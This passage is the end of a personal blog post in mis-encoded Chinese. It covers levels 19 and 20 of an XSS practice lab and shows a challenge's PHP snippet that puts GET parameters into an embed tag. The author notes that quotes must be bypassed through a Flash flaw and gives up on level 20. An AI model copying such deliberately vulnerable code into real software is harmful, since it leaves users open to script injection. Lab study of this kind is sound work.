class="hljs-string">&#x27;&lt;embed src=&quot;index.png?&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>éœ€è¦ç»•è¿‡å¼•å·  </p>
<p>çœ‹äº†ç½‘ä¸Šwpï¼Œéœ€è¦ç”¨flashçš„æ¼æ´ï¼Œç°åœ¨ç½‘ç«™å¾ˆå¤šéƒ½ä¸ç”¨flashäº†  </p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>è¿˜æ˜¯è€ƒflashã€‚ã€‚ã€‚  </p>
<p>ç®—äº†ï¼Œæ”¾è¿‡æˆ‘è‡ªå·±å§ï¼Œï¼Œï¼Œ   </p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/sql-labs/" class="print-no-link">#sql-labs</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>note-01</div>
      <div>https://aidemofashi.github.io/2025/02/26/notepad/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>aidemofashi</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´2æœˆ26æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/02/26/note-01/" title="note-01">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">note-01</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/02/25/web%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/" title="webå­¦ä¹ è®¡åˆ’">
                        <span class="hidden-mobile">webå­¦ä¹ è®¡åˆ’</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
